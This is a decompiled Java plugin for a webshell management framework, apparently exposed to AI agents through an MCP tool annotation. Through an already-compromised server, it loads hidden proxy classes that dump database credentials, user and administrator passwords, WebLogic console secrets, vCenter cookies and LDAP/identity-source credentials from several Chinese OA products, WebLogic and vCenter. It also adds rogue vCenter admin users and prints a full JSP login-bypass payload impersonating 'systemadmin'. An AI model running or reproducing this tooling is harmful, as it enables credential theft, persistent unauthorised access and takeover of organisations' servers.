//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.java;

import com.intellij.uiDesigner.core.GridConstraints;
import com.intellij.uiDesigner.core.GridLayoutManager;
import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.Dimension;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.io.IOException;
import java.io.InputStream;
import java.util.Objects;
import javax.swing.Icon;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import oracle.jdbc.replay.OracleDataSource;
import org.fife.ui.rtextarea.RTextScrollPane;
import util.automaticBindClick;
import util.functions;
import core.annotation.McpTool;
import core.annotation.McpParam;
import java.util.Map;
import util.http.ReqParameter;


@PluginAnnotation(
        payloadName = "JavaDynamicPayload",
        Name = "OaTools",
        DisplayName = "OaTools"
)
public class OaTools implements Plugin {
    private ShellEntity shellEntity;
    private Payload payload;
    private boolean Seeyonloaded = false;
    private boolean Weaverloaded = false;
    private boolean YongYouloaded = false;
    private boolean Ekploaded = false;
    private boolean hrmsloaded = false;
    private boolean Esafenetloaded = false;
    private boolean Weblogicloaded = false;
    private boolean vCenterloaded = false;
    private Encoding encoding;
    private JPanel corePanel;
    private JTabbedPane tabbedPane1;
    private JButton SeeyonGetDbButton;
    private JTextArea SeeyonresultTextArea;
    private JPanel SeeyonJPanel;
    private JButton WeaverGetDbButton;
    private RTextArea WeaverresultTextArea;
    private JButton WeaverGetAdminUserButton;
    private JButton WeaverGetUserButton;
    private JButton YongYouGetDbButton;
    private RTextArea YongYouresultTextArea;
    private JButton EkpGetDbButton;
    private JButton EkpGetAdmindoButton;
    private JButton EkpGetUserButton;
    private RTextArea EkpresultTextArea;
    private JButton WeblogicGetPassButton;
    private JButton WeblogicGetDbButton;
    private RTextArea WeblogicresultTextArea;
    private JButton vCenterGetDbbutton;
    private JButton vCenterGetVmsbutton;
    private JButton vCenterGetHostsbutton;
    private JButton vCenterGetCookiebutton;
    private RTextArea vCenterresultTextArea;
    private JButton vCenterGetvmwSTSPasswordbutton;
    private JTextField vCenterUrlTextField;
    private JTextField vCenterBaseTextField;
    private JTextField vCenterdcAccountDNTextField;
    private JTextField vCenterWebUIPassTextField;
    private JButton vCenterGetLdapInfobutton;
    private JTextField vCenterdcAccountPasswordTextField;
    private JTextField vCenterWebUIUserTextField;
    private JButton vCenterAddUserbutton;
    private JButton EsafenetGetdbButton;
    private RTextArea EsafenetresultTextArea;
    private JButton EsafenetLoginButton;
    private JButton hrmsGetDbButton;
    private RTextArea hrmsresultTextArea;
    private JButton hrmsGetUserButton;

    private /* synthetic */ void $$$setupUI$$$() {
        JPanel jPanel = new JPanel();
        this.corePanel = jPanel;
        jPanel.setLayout(new GridLayoutManager(1, 1, new Insets(0, 0, 0, 0), -1, -1, false, false));
        JTabbedPane jTabbedPane = new JTabbedPane();
        this.tabbedPane1 = jTabbedPane;
        jPanel.add(jTabbedPane, new GridConstraints(0, 0, 1, 1, 0, 3, 3, 3, null, new Dimension(200, 200), null));
        JPanel jPanel2 = new JPanel();
        this.SeeyonJPanel = jPanel2;
        jPanel2.setLayout(new GridLayoutManager(2, 1, new Insets(0, 0, 0, 0), -1, -1, false, false));
        jTabbedPane.addTab("致远", (Icon) null, jPanel2, (String) null);
        RTextScrollPane rTextScrollPane = new RTextScrollPane();
        jPanel2.add(rTextScrollPane, new GridConstraints(1, 0, 1, 1, 0, 3, 3, 3, null, null, null));
        RTextArea rTextArea = new RTextArea();
        this.SeeyonresultTextArea = rTextArea;
        rTextScrollPane.setViewportView(rTextArea);
        JButton jButton = new JButton();
        this.SeeyonGetDbButton = jButton;
        jButton.setText("获取数据库");
        jPanel2.add(jButton, new GridConstraints(0, 0, 1, 1, 8, 2, 3, 0, null, null, null));
        JPanel jPanel3 = new JPanel();
        jPanel3.setLayout(new GridLayoutManager(2, 3, new Insets(0, 0, 0, 0), -1, -1, false, false));
        jTabbedPane.addTab("宏景", (Icon) null, jPanel3, (String) null);
        RTextScrollPane rTextScrollPane2 = new RTextScrollPane();
        jPanel3.add(rTextScrollPane2, new GridConstraints(1, 0, 1, 3, 0, 3, 3, 3, null, null, null));
        RTextArea rTextArea2 = new RTextArea();
        this.hrmsresultTextArea = rTextArea2;
        rTextScrollPane2.setViewportView(rTextArea2);
        JButton jButton2 = new JButton();
        this.hrmsGetDbButton = jButton2;
        jButton2.setText("获取数据库");
        jPanel3.add(jButton2, new GridConstraints(0, 0, 1, 1, 8, 0, 3, 0, null, null, null));
        JButton jButton3 = new JButton();
        this.hrmsGetUserButton = jButton3;
        jButton3.setText("获取用户");
        jPanel3.add(jButton3, new GridConstraints(0, 2, 1, 1, 8, 0, 3, 0, null, null, null));
        JPanel jPanel4 = new JPanel();
        jPanel4.setLayout(new GridLayoutManager(2, 1, new Insets(0, 0, 0, 0), -1, -1, false, false));
        jTabbedPane.addTab("用友", (Icon) null, jPanel4, (String) null);
        RTextScrollPane rTextScrollPane3 = new RTextScrollPane();
        jPanel4.add(rTextScrollPane3, new GridConstraints(1, 0, 1, 1, 0, 3, 3, 3, null, null, null));
        RTextArea rTextArea3 = new RTextArea();
        this.YongYouresultTextArea = rTextArea3;
        rTextScrollPane3.setViewportView(rTextArea3);
        JButton jButton4 = new JButton();
        this.YongYouGetDbButton = jButton4;
        jButton4.setText("获取数据库");
        jPanel4.add(jButton4, new GridConstraints(0, 0, 1, 1, 8, 0, 3, 0, null, null, null));
        JPanel jPanel5 = new JPanel();
        jPanel5.setLayout(new GridLayoutManager(2, 35, new Insets(0, 0, 0, 0), -1, -1, false, false));
        jTabbedPane.addTab("泛微", (Icon) null, jPanel5, (String) null);
        JButton jButton5 = new JButton();
        this.WeaverGetDbButton = jButton5;
        jButton5.setText("获取数据库");
        jPanel5.add(jButton5, new GridConstraints(0, 0, 1, 1, 8, 0, 3, 0, null, null, null));
        RTextScrollPane rTextScrollPane4 = new RTextScrollPane();
        jPanel5.add(rTextScrollPane4, new GridConstraints(1, 0, 1, 35, 0, 3, 3, 3, null, null, null));
        RTextArea rTextArea4 = new RTextArea();
        this.WeaverresultTextArea = rTextArea4;
        rTextScrollPane4.setViewportView(rTextArea4);
        JButton jButton6 = new JButton();
        this.WeaverGetAdminUserButton = jButton6;
        jButton6.setText("获取管理员");
        jPanel5.add(jButton6, new GridConstraints(0, 1, 1, 1, 8, 0, 3, 0, null, null, null));
        JButton jButton7 = new JButton();
        this.WeaverGetUserButton = jButton7;
        jButton7.setText("获取用户");
        jPanel5.add(jButton7, new GridConstraints(0, 2, 1, 3, 8, 0, 3, 0, null, null, null));
        JPanel jPanel6 = new JPanel();
        jPanel6.setLayout(new GridLayoutManager(2, 3, new Insets(0, 0, 0, 0), -1, -1, false, false));
        jTabbedPane.addTab("蓝凌", (Icon) null, jPanel6, (String) null);
        RTextScrollPane rTextScrollPane5 = new RTextScrollPane();
        jPanel6.add(rTextScrollPane5, new GridConstraints(1, 0, 1, 3, 0, 3, 3, 3, null, null, null));
        RTextArea rTextArea5 = new RTextArea();
        this.EkpresultTextArea = rTextArea5;
        rTextScrollPane5.setViewportView(rTextArea5);
        JButton jButton8 = new JButton();
        this.EkpGetDbButton = jButton8;
        jButton8.setText("获取数据库");
        jPanel6.add(jButton8, new GridConstraints(0, 0, 1, 1, 8, 0, 3, 0, null, null, null));
        JButton jButton9 = new JButton();
        this.EkpGetAdmindoButton = jButton9;
        jButton9.setText("获取admin.do密码");
        jPanel6.add(jButton9, new GridConstraints(0, 1, 1, 1, 8, 0, 3, 0, null, null, null));
        JButton jButton10 = new JButton();
        this.EkpGetUserButton = jButton10;
        jButton10.setText("获取用户");
        jPanel6.add(jButton10, new GridConstraints(0, 2, 1, 1, 8, 0, 3, 0, null, null, null));
        JPanel jPanel7 = new JPanel();
        jPanel7.setLayout(new GridLayoutManager(2, 21, new Insets(0, 0, 0, 0), -1, -1, false, false));
        jTabbedPane.addTab("亿赛通", (Icon) null, jPanel7, (String) null);
        RTextScrollPane rTextScrollPane6 = new RTextScrollPane();
        jPanel7.add(rTextScrollPane6, new GridConstraints(1, 0, 1, 21, 0, 3, 3, 3, null, null, null));
        RTextArea rTextArea6 = new RTextArea();
        this.EsafenetresultTextArea = rTextArea6;
        rTextScrollPane6.setViewportView(rTextArea6);
        JButton jButton11 = new JButton();
        this.EsafenetGetdbButton = jButton11;
        jButton11.setText("获取数据库");
        jPanel7.add(jButton11, new GridConstraints(0, 0, 1, 1, 8, 0, 3, 0, null, null, null));
        JButton jButton12 = new JButton();
        this.EsafenetLoginButton = jButton12;
        jButton12.setText("登录绕过");
        jPanel7.add(jButton12, new GridConstraints(0, 1, 1, 1, 8, 0, 3, 0, null, null, null));
        JPanel jPanel8 = new JPanel();
        jPanel8.setLayout(new GridLayoutManager(2, 4, new Insets(0, 0, 0, 0), -1, -1, false, false));
        jTabbedPane.addTab("weblogic", (Icon) null, jPanel8, (String) null);
        RTextScrollPane rTextScrollPane7 = new RTextScrollPane();
        jPanel8.add(rTextScrollPane7, new GridConstraints(1, 0, 1, 4, 0, 3, 3, 3, null, null, null));
        RTextArea rTextArea7 = new RTextArea();
        this.WeblogicresultTextArea = rTextArea7;
        rTextScrollPane7.setViewportView(rTextArea7);
        JButton jButton13 = new JButton();
        this.WeblogicGetPassButton = jButton13;
        jButton13.setText("获取控制台密码");
        jPanel8.add(jButton13, new GridConstraints(0, 0, 1, 1, 8, 0, 3, 0, null, null, null));
        JButton jButton14 = new JButton();
        this.WeblogicGetDbButton = jButton14;
        jButton14.setText("获取数据库");
        jPanel8.add(jButton14, new GridConstraints(0, 1, 1, 1, 8, 0, 3, 0, null, null, null));
        JPanel jPanel9 = new JPanel();
        jPanel9.setLayout(new GridLayoutManager(4, 46, new Insets(0, 0, 0, 0), -1, -1, false, false));
        jTabbedPane.addTab("vCenter", (Icon) null, jPanel9, (String) null);
        RTextScrollPane rTextScrollPane8 = new RTextScrollPane();
        jPanel9.add(rTextScrollPane8, new GridConstraints(3, 0, 1, 46, 0, 3, 3, 3, null, null, null));
        RTextArea rTextArea8 = new RTextArea();
        this.vCenterresultTextArea = rTextArea8;
        rTextArea8.setText("");
        rTextScrollPane8.setViewportView(rTextArea8);
        JLabel jLabel = new JLabel();
        jLabel.setText("Url:");
        jPanel9.add(jLabel, new GridConstraints(0, 0, 1, 1, 0, 3, 0, 0, null, null, null));
        JTextField jTextField = new JTextField();
        this.vCenterUrlTextField = jTextField;
        jTextField.setText("ldap://127.0.0.1:389/");
        jPanel9.add(jTextField, new GridConstraints(0, 1, 1, 1, 0, 3, 6, 0, null, new Dimension(150, -1), null));
        JLabel jLabel2 = new JLabel();
        jLabel2.setText("Base:");
        jPanel9.add(jLabel2, new GridConstraints(0, 2, 1, 1, 8, 2, 0, 0, null, null, null));
        JTextField jTextField2 = new JTextField();
        this.vCenterBaseTextField = jTextField2;
        jTextField2.setText("DC=vsphere,DC=local");
        jPanel9.add(jTextField2, new GridConstraints(0, 3, 1, 1, 0, 3, 6, 0, null, new Dimension(150, -1), null));
        JLabel jLabel3 = new JLabel();
        jLabel3.setText("dcAccountDN:");
        jPanel9.add(jLabel3, new GridConstraints(1, 0, 1, 1, 0, 3, 0, 0, null, null, null));
        JTextField jTextField3 = new JTextField();
        this.vCenterdcAccountDNTextField = jTextField3;
        jTextField3.setText("");
        jPanel9.add(jTextField3, new GridConstraints(1, 1, 1, 1, 0, 3, 6, 0, null, new Dimension(150, -1), null));
        JButton jButton15 = new JButton();
        this.vCenterGetDbbutton = jButton15;
        jButton15.setText("获取数据库");
        jPanel9.add(jButton15, new GridConstraints(0, 5, 1, 1, 0, 1, 3, 0, null, null, null));
        JButton jButton16 = new JButton();
        this.vCenterGetVmsbutton = jButton16;
        jButton16.setText("查询虚拟主机");
        jPanel9.add(jButton16, new GridConstraints(0, 6, 1, 1, 0, 1, 3, 0, null, null, null));
        JButton jButton17 = new JButton();
        this.vCenterGetHostsbutton = jButton17;
        jButton17.setText("查询数据中心");
        jPanel9.add(jButton17, new GridConstraints(1, 6, 1, 1, 0, 1, 3, 0, null, null, null));
        JButton jButton18 = new JButton();
        this.vCenterGetCookiebutton = jButton18;
        jButton18.setEnabled(true);
        jButton18.setText("获取Cookie");
        jPanel9.add(jButton18, new GridConstraints(1, 5, 1, 1, 0, 1, 3, 0, null, null, null));
        JLabel jLabel4 = new JLabel();
        jLabel4.setText("dcAccountPassword:");
        jPanel9.add(jLabel4, new GridConstraints(2, 0, 1, 1, 0, 3, 0, 0, null, null, null));
        JTextField jTextField4 = new JTextField();
        this.vCenterdcAccountPasswordTextField = jTextField4;
        jTextField4.setText("");
        jPanel9.add(jTextField4, new GridConstraints(2, 1, 1, 1, 0, 3, 6, 0, null, new Dimension(150, -1), null));
        JButton jButton19 = new JButton();
        this.vCenterGetLdapInfobutton = jButton19;
        jButton19.setText("获取Ldap信息");
        jPanel9.add(jButton19, new GridConstraints(0, 4, 1, 1, 0, 1, 3, 0, null, null, null));
        JLabel jLabel5 = new JLabel();
        jLabel5.setText("WebUI Pass:");
        jPanel9.add(jLabel5, new GridConstraints(2, 2, 1, 1, 0, 3, 0, 0, null, null, null));
        JTextField jTextField5 = new JTextField();
        this.vCenterWebUIPassTextField = jTextField5;
        jTextField5.setText("P@ssw0rd#t3st");
        jPanel9.add(jTextField5, new GridConstraints(2, 3, 1, 1, 0, 3, 6, 0, null, new Dimension(150, -1), null));
        JLabel jLabel6 = new JLabel();
        jLabel6.setText("WebUI User:");
        jPanel9.add(jLabel6, new GridConstraints(1, 2, 1, 1, 0, 3, 0, 0, null, null, null));
        JTextField jTextField6 = new JTextField();
        this.vCenterWebUIUserTextField = jTextField6;
        jTextField6.setText("testuser");
        jPanel9.add(jTextField6, new GridConstraints(1, 3, 1, 1, 0, 3, 6, 0, null, new Dimension(150, -1), null));
        JButton jButton20 = new JButton();
        this.vCenterAddUserbutton = jButton20;
        jButton20.setText("添加管理员用户");
        jPanel9.add(jButton20, new GridConstraints(1, 4, 1, 1, 0, 1, 3, 0, null, null, null));
        JButton jButton21 = new JButton();
        this.vCenterGetvmwSTSPasswordbutton = jButton21;
        jButton21.setText("获取标识源凭据");
        jPanel9.add(jButton21, new GridConstraints(2, 4, 1, 1, 0, 1, 3, 0, null, null, null));
    }

    public /* synthetic */ JComponent $$$getRootComponent$$$() {
        return this.corePanel;
    }

    public OaTools() {
        $$$setupUI$$$();
    }

    @McpTool(name = "proxy", desc = "OA 系统信息提取 (Seeyon/Weaver/YongYou/Ekp/hrms/Esafenet/Weblogic/vCenter)", params = {
            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
            @McpParam(name = "target", required = true, desc = "seeyon/weaver/yongyou/hrms/ekp/esafenet/weblogic/vcenter"),
            @McpParam(name = "method", required = true, desc = "如 GetDb/GetUser/GetPass/GetVms/GetHost/GetCookie/GetvmwSTSPassword/GetLdapInfo/GetAdminUser/GetAdmindo") })
    public String mcpProxy(Map<String, Object> args) {
        String target = String.valueOf(args.get("target"));
        String method = String.valueOf(args.get("method"));
        String proxy = proxyName(target);
        if (proxy == null) return "未知 target: " + target;
        if (!loadProxy(target)) return "插件加载失败: " + target;
        try {
            ReqParameter reqParameter = new ReqParameter();
            byte[] r = this.payload.evalFunc(proxy, method, reqParameter);
            return this.encoding.Decoding(r);
        } catch (Exception e) {
            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
        }
    }

    private String proxyName(String target) {
        if ("seeyon".equalsIgnoreCase(target)) return "SeeyonProxy";
        if ("weaver".equalsIgnoreCase(target)) return "WeaverProxy";
        if ("yongyou".equalsIgnoreCase(target)) return "YongYouProxy";
        if ("hrms".equalsIgnoreCase(target)) return "hrmsProxy";
        if ("ekp".equalsIgnoreCase(target)) return "EkpProxy";
        if ("esafenet".equalsIgnoreCase(target)) return "EsafenetProxy";
        if ("weblogic".equalsIgnoreCase(target)) return "WeblogicProxy";
        if ("vcenter".equalsIgnoreCase(target)) return "vCenterProxy";
        return null;
    }

    private boolean loadProxy(String target) {
        if ("seeyon".equalsIgnoreCase(target)) return Seeyonload();
        if ("weaver".equalsIgnoreCase(target)) return Weaverload();
        if ("yongyou".equalsIgnoreCase(target)) return YongYouload();
        if ("hrms".equalsIgnoreCase(target)) return hrmsload();
        if ("ekp".equalsIgnoreCase(target)) return Ekpload();
        if ("esafenet".equalsIgnoreCase(target)) return Esafenetload();
        if ("weblogic".equalsIgnoreCase(target)) return Weblogicload();
        if ("vcenter".equalsIgnoreCase(target)) return vCenterload();
        return false;
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = shellEntity.getPayloadModule();
        this.encoding = shellEntity.getEncodingModule();
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.corePanel;
    }

    private void SeeyonGetDbButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.Seeyonload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("SeeyonProxy", "GetDb", reqParameter));
            this.SeeyonresultTextArea.append(result);
        } else {
            this.SeeyonresultTextArea.setText("plugin not loaded");
        }

    }

    private void WeaverGetDbButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.Weaverload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("WeaverProxy", "GetDb", reqParameter));
            this.WeaverresultTextArea.append(result);
        } else {
            this.WeaverresultTextArea.setText("plugin not loaded");
        }

    }

    private void WeaverGetAdminUserButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.Weaverload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("WeaverProxy", "GetAdminUser", reqParameter));
            this.WeaverresultTextArea.append(result);
        } else {
            this.WeaverresultTextArea.setText("plugin not loaded");
        }

    }

    private void WeaverGetUserButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.Weaverload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("WeaverProxy", "GetUser", reqParameter));
            this.WeaverresultTextArea.append(result);
        } else {
            this.WeaverresultTextArea.setText("plugin not loaded");
        }

    }

    private void YongYouGetDbButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.YongYouload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("YongYouProxy", "GetDb", reqParameter));
            this.YongYouresultTextArea.append(result);
        } else {
            this.YongYouresultTextArea.setText("plugin not loaded");
        }

    }

    private void hrmsGetDbButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.hrmsload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("hrmsProxy", "GetDb", reqParameter));
            this.hrmsresultTextArea.append(result);
        } else {
            this.hrmsresultTextArea.setText("plugin not loaded");
        }

    }

    private void hrmsGetUserButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.hrmsload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("hrmsProxy", "GetUser", reqParameter));
            this.hrmsresultTextArea.append(result);
        } else {
            this.hrmsresultTextArea.setText("plugin not loaded");
        }

    }

    private void EkpGetDbButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.Ekpload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("EkpProxy", "GetDb", reqParameter));
            this.EkpresultTextArea.append(result);
        } else {
            this.EkpresultTextArea.setText("plugin not loaded");
        }

    }

    private void EkpGetAdmindoButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.Ekpload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("EkpProxy", "GetAdmindo", reqParameter));
            this.EkpresultTextArea.append(result);
        } else {
            this.EkpresultTextArea.setText("plugin not loaded");
        }

    }

    private void EkpGetUserButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.Ekpload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("EkpProxy", "GetUser", reqParameter));
            this.EkpresultTextArea.append(result);
        } else {
            this.EkpresultTextArea.setText("plugin not loaded");
        }

    }

    private void EsafenetGetdbButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.Esafenetload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("EsafenetProxy", "GetDb", reqParameter));
            this.EsafenetresultTextArea.append(result);
        } else {
            this.EsafenetresultTextArea.setText("plugin not loaded");
        }

    }

    private void EsafenetLoginButtonClick(ActionEvent actionEvent) throws IOException {
        this.EsafenetresultTextArea.append("------notice------\n1.upload LoginCas.jsp to target server\n2.Send Get request to LoginCas.jsp\n");
        this.EsafenetresultTextArea.append("------LoginCas.jsp------\n");
        this.EsafenetresultTextArea.append("<%@ page import=\"com.org.User\"%>\n<%@ page import=\"com.esafenet.dao.user.UserDao\"%>\n<%@ page import=\"com.esafenet.ta.util.CookieUtil\"%>\n<%@ page import=\"com.org.acl.LoginMng\"%>\n<%\ntry{\nUser user = (new UserDao()).findUserById(\"systemadmin\");\nCookieUtil.setCookie(response, \"CDGServerLanguage\", \"zh\");\nrequest.getSession().setAttribute(\"sltLanguage\", \"zh\");\nLoginMng loginMng = (LoginMng)request.getSession(true).getAttribute(\"loginMng\");\nif (loginMng == null || !loginMng.isLogin()) {\n    loginMng = new LoginMng();\n    loginMng.login(user);\n    session.setAttribute(\"loginMng\", loginMng);\n}\nresponse.sendRedirect(\"/CDGServer3/frame.jsp\");\n}catch(Exception e){\n\nout.println(e.getMessage());\n}%>\n");
        this.EsafenetresultTextArea.append("---------------------------\n");
    }

    private void WeblogicGetPassButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.Weblogicload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("WeblogicProxy", "GetPass", reqParameter));
            this.WeblogicresultTextArea.append(result);
        } else {
            this.WeblogicresultTextArea.setText("plugin not loaded");
        }

    }

    private void WeblogicGetDbButtonClick(ActionEvent actionEvent) throws IOException {
        if (this.Weblogicload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("WeblogicProxy", "GetDb", reqParameter));
            this.WeblogicresultTextArea.append(result);
        } else {
            this.WeblogicresultTextArea.setText("plugin not loaded");
        }

    }

    private void vCenterGetDbbuttonClick(ActionEvent actionEvent) throws IOException {
        if (this.vCenterload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("vCenterProxy", "GetDb", reqParameter));
            this.vCenterresultTextArea.append(result);
        } else {
            this.vCenterresultTextArea.setText("plugin not loaded");
        }

    }

    private void vCenterGetVmsbuttonClick(ActionEvent actionEvent) throws IOException {
        if (this.vCenterload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("vCenterProxy", "GetVms", reqParameter));
            this.vCenterresultTextArea.append(result);
        } else {
            this.vCenterresultTextArea.setText("plugin not loaded");
        }

    }

    private void vCenterGetHostsbuttonClick(ActionEvent actionEvent) throws IOException {
        if (this.vCenterload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("vCenterProxy", "GetHost", reqParameter));
            this.vCenterresultTextArea.append(result);
        } else {
            this.vCenterresultTextArea.setText("plugin not loaded");
        }

    }

    private void vCenterGetCookiebuttonClick(ActionEvent actionEvent) throws IOException {
        if (this.vCenterload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("vCenterProxy", "GetCookie", reqParameter));
            this.vCenterresultTextArea.append(result);
        } else {
            this.vCenterresultTextArea.setText("plugin not loaded");
        }

    }

    private void vCenterGetvmwSTSPasswordbuttonClick(ActionEvent actionEvent) throws IOException {
        if (this.vCenterload()) {
            String url = this.vCenterUrlTextField.getText();
            String Base = this.vCenterBaseTextField.getText();
            String dcAccountDN = this.vCenterdcAccountDNTextField.getText();
            String WebUIPass = this.vCenterWebUIPassTextField.getText();
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("url", this.encoding.Encoding(url));
            reqParameter.add("Base", this.encoding.Encoding(Base));
            reqParameter.add("dcAccountDN", this.encoding.Encoding(dcAccountDN));
            reqParameter.add("WebUIPass", this.encoding.Encoding(WebUIPass));
            String result = this.encoding.Decoding(this.payload.evalFunc("vCenterProxy", "GetvmwSTSPassword", reqParameter));
            this.vCenterresultTextArea.append(result);
        } else {
            this.vCenterresultTextArea.setText("plugin not loaded");
        }

    }

    private void vCenterGetLdapInfobuttonClick(ActionEvent actionEvent) throws IOException {
        if (this.vCenterload()) {
            ReqParameter reqParameter = new ReqParameter();
            String result = this.encoding.Decoding(this.payload.evalFunc("vCenterProxy", "GetLdapInfo", reqParameter));
            this.vCenterresultTextArea.append(result);
            if (result.indexOf("Url") > -1 && result.indexOf("dcAccountDN") > -1 && result.indexOf("dcAccountPassword") > -1) {
                this.vCenterUrlTextField.setText(result.split("\n")[1].replace("Url: ", "").trim());
                this.vCenterdcAccountDNTextField.setText(result.split("\n")[2].replace("dcAccountDN: ", "").trim());
                this.vCenterdcAccountPasswordTextField.setText(result.split("\n")[3].replace("dcAccountPassword: ", "").trim());
            }
        } else {
            this.vCenterresultTextArea.setText("plugin not loaded");
        }

    }

    private void vCenterAddUserbuttonClick(ActionEvent actionEvent) throws IOException {
        if (this.vCenterload()) {
            String url = this.vCenterUrlTextField.getText().trim();
            String Base = this.vCenterBaseTextField.getText().trim();
            String dcAccountDN = this.vCenterdcAccountDNTextField.getText().trim();
            String dcAccountPassword = this.vCenterdcAccountPasswordTextField.getText().trim();
            String WebUIUser = this.vCenterWebUIUserTextField.getText().trim();
            String WebUIPass = this.vCenterWebUIPassTextField.getText().trim();
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("url", this.encoding.Encoding(url));
            reqParameter.add("Base", this.encoding.Encoding(Base));
            reqParameter.add("dcAccountDN", this.encoding.Encoding(dcAccountDN));
            reqParameter.add("dcAccountPassword", this.encoding.Encoding(dcAccountPassword));
            reqParameter.add("WebUIUser", this.encoding.Encoding(WebUIUser));
            reqParameter.add("WebUIPass", this.encoding.Encoding(WebUIPass));
            String result = this.encoding.Decoding(this.payload.evalFunc("vCenterProxy", "AddUser", reqParameter));
            this.vCenterresultTextArea.append(result);
        } else {
            this.vCenterresultTextArea.setText("plugin not loaded");
        }

    }

    private boolean Seeyonload() {
        if (!this.Seeyonloaded) {
            this.Seeyonloaded = this.payload.include("SeeyonProxy", functions.readInputStreamAutoClose((InputStream)Objects.requireNonNull(OaTools.class.getResourceAsStream("assets/SeeyonProxy.classs"))));
        }

        return this.Seeyonloaded;
    }

    private boolean Weaverload() {
        if (!this.Weaverloaded) {
            this.Weaverloaded = this.payload.include("WeaverProxy", functions.readInputStreamAutoClose((InputStream)Objects.requireNonNull(OaTools.class.getResourceAsStream("assets/WeaverProxy.classs"))));
        }

        return this.Weaverloaded;
    }

    private boolean YongYouload() {
        if (!this.YongYouloaded) {
            this.YongYouloaded = this.payload.include("YongYouProxy", functions.readInputStreamAutoClose((InputStream)Objects.requireNonNull(OaTools.class.getResourceAsStream("assets/YongYouProxy.classs"))));
        }

        return this.YongYouloaded;
    }

    private boolean Ekpload() {
        if (!this.Ekploaded) {
            this.Ekploaded = this.payload.include("EkpProxy", functions.readInputStreamAutoClose((InputStream)Objects.requireNonNull(OaTools.class.getResourceAsStream("assets/EkpProxy.classs"))));
        }

        return this.Ekploaded;
    }

    private boolean hrmsload() {
        if (!this.hrmsloaded) {
            this.hrmsloaded = this.payload.include("hrmsProxy", functions.readInputStreamAutoClose((InputStream)Objects.requireNonNull(OaTools.class.getResourceAsStream("assets/hrmsProxy.classs"))));
        }

        return this.hrmsloaded;
    }

    private boolean Esafenetload() {
        if (!this.Esafenetloaded) {
            this.Esafenetloaded = this.payload.include("EsafenetProxy", functions.readInputStreamAutoClose((InputStream)Objects.requireNonNull(OaTools.class.getResourceAsStream("assets/EsafenetProxy.classs"))));
        }

        return this.Esafenetloaded;
    }

    private boolean Weblogicload() {
        if (!this.Weblogicloaded) {
            this.Weblogicloaded = this.payload.include("WeblogicProxy", functions.readInputStreamAutoClose((InputStream)Objects.requireNonNull(OaTools.class.getResourceAsStream("assets/WeblogicProxy.classs"))));
        }

        return this.Weblogicloaded;
    }

    private boolean vCenterload() {
        if (!this.vCenterloaded) {
            this.vCenterloaded = this.payload.include("vCenterProxy", functions.readInputStreamAutoClose((InputStream)Objects.requireNonNull(OaTools.class.getResourceAsStream("assets/vCenterProxy.classs"))));
        }

        return this.vCenterloaded;
    }
}
